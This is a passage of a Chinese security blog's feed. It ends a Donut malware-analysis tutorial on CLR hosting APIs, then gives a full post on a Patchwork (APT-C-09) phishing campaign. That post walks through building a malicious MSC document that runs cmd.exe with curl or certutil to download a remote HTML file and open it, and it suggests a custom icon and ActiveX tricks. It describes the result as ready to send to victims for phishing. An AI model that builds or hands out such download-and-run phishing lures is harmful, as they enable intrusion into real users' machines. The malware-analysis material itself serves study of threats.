src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821105016389.png" alt="image-20250821105016389"></p><p>需要注意的是，堆栈顶部的元素并非文档中常见的版本字符串，而是指向ICLRMetaHost实例的指针。这是因为C++编译器会隐式地将“This”指针传递给非静态成员函数。虽然这种操作在源代码和IDA的伪代码视图中不可见，但通过反汇编分析仍可观察到。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821105353845.png" alt="image-20250821105353845"></p><p>接着</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821110213187.png" alt="image-20250821110213187"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821110234124.png" alt="image-20250821110234124"></p><h3 id="部分总结3-CLR"><a href="#部分总结3-CLR" class="headerlink" title="部分总结3 CLR"></a>部分总结3 CLR</h3><p>我们花了相当长的时间单步执行函数并检查它们的参数和返回值。让我们花点时间回顾并在此列出这些函数：</p><ul><li>CLRCreateInstance</li><li>ICLRMetaHost::GetRuntime</li><li>CLRRuntimeInfoImpl::IsLoadable</li><li>CLRRuntimeInfoImpl::GetInterface</li><li>ICorRuntimeHost::Start</li></ul><p>我们借此机会回顾并自问恶意软件在这里在做什么。搜索我们上面遇到的函数会得到许多关于从 C&#x2F;C++ 代码运行 .NET 程序集，或在非托管&#x2F;原生可执行文件中运行托管可执行文件的文章。回顾我们之前关于非托管代码与托管代码的讨论，托管代码必须在 CLR 中运行。这里恶意软件似乎在做的是使用一系列 API 函数创建一个 CLR，很可能是为了准备运行之前复制到内存中的 PE 文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;A-Mega-Malware-Analysis-Tutorial-Featuring-Donut&quot;&gt;&lt;a href=&quot;#A-Mega-Malware-Analysis-Tutorial-Featuring-Donut&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="恶意样本分析" scheme="https://250wuyifan.github.io/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="恶意样本分析" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>apt-c-09（摩诃草）组织基于mythic C2框架的新型攻击样本分析</title>
    <link href="https://250wuyifan.github.io/2025/08/18/C2%E6%A1%86%E6%9E%B6%E7%9A%84%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/18/C2%E6%A1%86%E6%9E%B6%E7%9A%84%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2025-08-17T16:07:16.000Z</published>
    <updated>2025-08-18T01:57:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apt-c-09（摩诃草）组织基于mythic-C2框架的新型攻击样本分析"><a href="#apt-c-09（摩诃草）组织基于mythic-C2框架的新型攻击样本分析" class="headerlink" title="apt-c-09（摩诃草）组织基于mythic C2框架的新型攻击样本分析"></a>apt-c-09（摩诃草）组织基于mythic C2框架的新型攻击样本分析</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818001253423.png" alt="image-20250818001253423"></p><p><a href="https://mp.weixin.qq.com/s/w2qLpwcx36_XiWcVzxRWuQ">https://mp.weixin.qq.com/s/w2qLpwcx36_XiWcVzxRWuQ</a></p><h2 id="攻击活动分析"><a href="#攻击活动分析" class="headerlink" title="攻击活动分析"></a>攻击活动分析</h2><p>摩诃草组织通过发送携带MSC文档的邮件发起钓鱼攻击。用户打开MSC文档后会远程加载一个html文件，该文件内嵌混淆的jscript代码，jscript脚本执行时会从远程下载诱饵文档，同时释放恶意dll，并通过白利用的方式加载恶意dll，经分析该dll属于Mythic C2框架组件。同时，我们也发现一个lnk样本从相同远程服务器下载BADNEWS木马，整个攻击流程如下所示：<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818001530204.png" alt="image-20250818001530204"></p><h2 id="MSC文档制作"><a href="#MSC文档制作" class="headerlink" title="MSC文档制作"></a>MSC文档制作</h2><h3 id="1-打开mmc"><a href="#1-打开mmc" class="headerlink" title="1.打开mmc"></a>1.打开mmc</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818002233648.png" alt="image-20250818002233648"></p><h3 id="2-制作mcn"><a href="#2-制作mcn" class="headerlink" title="2.制作mcn"></a>2.制作mcn</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818002307431.png" alt="image-20250818002307431"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818070856929.png" alt="image-20250818070856929"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818070920014.png" alt="image-20250818070920014"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818070956602.png" alt="image-20250818070956602"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令(C): cmd.exe</span><br><span class="line">参数(P): /c curl -o <span class="number">1.</span>html <span class="string">&quot;http://localhost:8080/1.html&quot;</span> &amp;&amp; start <span class="string">&quot;&quot;</span> <span class="string">&quot;1.html&quot;</span></span><br></pre></td></tr></table></figure><p>在这里可以选择自定义图标</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071040216.png" alt="image-20250818071040216"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071214968.png" alt="image-20250818071214968"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071241069.png" alt="image-20250818071241069"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071340908.png" alt="image-20250818071340908"></p><p>在这里选择保存到本地即可发给别人使用了</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071600144.png" alt="image-20250818071600144"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071649260.png" alt="image-20250818071649260"></p><p>既然会自动让默认浏览器打开网页那么需要关注这个html怎么进行操作即可，下图是在win732环境下测试的，需要注意的是，要小改之前的cmd命令，因为有的计算机没有curl。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c &quot;certutil -urlcache -split -f &quot;http://192.168.239.1:8080/1.html&quot; &quot;%TEMP%\1.html&quot; &amp;&amp; start &quot;&quot; &quot;%TEMP%\1.html&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818080355326.png" alt="image-20250818080355326"></p><p>为什么使用win7呢，因为此版本默认是ie浏览器，ie浏览器中可以使用一种activex的技术,进行一些操作来执行一些命令，比如文中的写一个计划任务，还有好多操作可以做，有点类似与office系列的宏，里面也有ActiveX技术的,这里先不做介绍了。重点在于msc文件的制作与社会工程学结合，更好的进行钓鱼，我这里只做了一个开始。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;apt-c-09（摩诃草）组织基于mythic-C2框架的新型攻击样本分析&quot;&gt;&lt;a href=&quot;#apt-c-09（摩诃草）组织基于mythic-C2框架的新型攻击样本分析&quot; class=&quot;headerlink&quot; title=&quot;apt-c-09（摩诃草）组织基于m</summary>
      
    
    
    
    <category term="恶意样本分析" scheme="https://250wuyifan.github.io/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="恶意样本分析" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
